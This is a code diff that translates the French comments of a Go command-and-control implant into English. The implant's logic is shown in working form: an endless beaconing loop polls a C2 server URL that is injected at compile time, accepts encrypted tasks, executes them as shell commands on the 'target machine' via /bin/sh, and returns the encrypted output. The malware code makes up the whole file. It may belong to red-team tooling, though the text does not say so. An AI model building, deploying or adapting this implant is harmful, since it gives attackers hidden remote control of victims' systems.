@@ -10,54 +10,55 @@ import (
 	"time"
 )
 
-// C2_URL est l'URL du serveur de Command & Control.
-// Cette valeur sera injectée au moment de la compilation.
+// C2_URL is the URL of the Command & Control server.
+// This value will be injected at compile time.
 var C2_URL = "http://localhost:8000/c2/implant/callback"
 var AgentID = "default_agent"
 var EncryptionKey = "_THIS_IS_A_DEFAULT_32_BYTE_KEY_"
 
-// Task représente une commande reçue du C2.
+// Task represents a command received from the C2.
 type Task struct {
 	ID      string `json:"id"`
 	Command string `json:"command"`
 }
 
-// TaskResult représente le résultat d'une commande exécutée.
+// TaskResult represents the result of an executed command.
 type TaskResult struct {
 	TaskID string `json:"task_id"`
 	Output string `json:"output"`
 }
 
+// EncryptedPayload is a generic wrapper for encrypted data.
 type EncryptedPayload struct {
 	Data string `json:"data"`
 }
 
 func main() {
-	// Boucle infinie pour contacter le C2 périodiquement (beaconing).
+	// Infinite loop to periodically contact the C2 (beaconing).
 	for {
-		// Demande une nouvelle tâche au C2.
+		// Request a new task from the C2.
 		task, err := getTask()
 		if err != nil {
 			fmt.Println("Error getting task:", err)
-			time.Sleep(30 * time.Second) // Attend avant de réessayer en cas d'erreur.
+			time.Sleep(30 * time.Second) // Wait before retrying on error.
 			continue
 		}
 
-		// Si aucune tâche n'est disponible, attend avant de redemander.
+		// If no task is available, wait before asking again.
 		if task.Command == "" {
 			time.Sleep(10 * time.Second)
 			continue
 		}
 
-		// Exécute la tâche.
+		// Execute the task.
 		output := executeCommand(task.Command)
 
-		// Envoie le résultat au C2.
+		// Send the result to the C2.
 		sendResult(TaskResult{TaskID: task.ID, Output: output})
 	}
 }
 
-// getTask contacte le C2 pour obtenir une nouvelle tâche.
+// getTask contacts the C2 to get a new task.
 func getTask() (*Task, error) {
 	client := &http.Client{}
 	req, err := http.NewRequest("GET", C2_URL, nil)
@@ -77,10 +78,10 @@ func getTask() (*Task, error) {
 		return nil, err
 	}
 
-	// Le corps est chiffré, on le déchiffre.
+	// The body is encrypted, so we decrypt it.
 	var encryptedPayload EncryptedPayload
 	if err := json.Unmarshal(body, &encryptedPayload); err != nil {
-		// Si le payload n'est pas du JSON chiffré, c'est peut-être une réponse "pas de tâche" non chiffrée.
+		// If the payload is not encrypted JSON, it might be an unencrypted "no task" response.
 		var task Task
 		if json.Unmarshal(body, &task) == nil && task.Command == "" {
 			return &task, nil
@@ -102,7 +103,7 @@ func getTask() (*Task, error) {
 	return &task, nil
 }
 
-// executeCommand exécute une commande shell sur la machine cible.
+// executeCommand executes a shell command on the target machine.
 func executeCommand(command string) string {
 	cmd := exec.Command("/bin/sh", "-c", command)
 	var out bytes.Buffer
@@ -117,7 +118,7 @@ func executeCommand(command string) string {
 	return out.String()
 }
 
-// sendResult envoie le résultat de la tâche au C2.
+// sendResult sends the task result to the C2.
 func sendResult(result TaskResult) {
 	jsonData, err := json.Marshal(result)
 	if err != nil {
@@ -125,14 +126,14 @@ func sendResult(result TaskResult) {
 		return
 	}
 
-	// Chiffre le résultat
+	// Encrypt the result
 	encryptedData, err := Encrypt(jsonData, []byte(EncryptionKey))
 	if err != nil {
 		fmt.Println("Error encrypting result:", err)
 		return
 	}
 
-	// Prépare le payload chiffré
+	// Prepare the encrypted payload
 	payload := EncryptedPayload{Data: encryptedData}
 	encryptedPayloadBytes, err := json.Marshal(payload)
 	if err != nil {
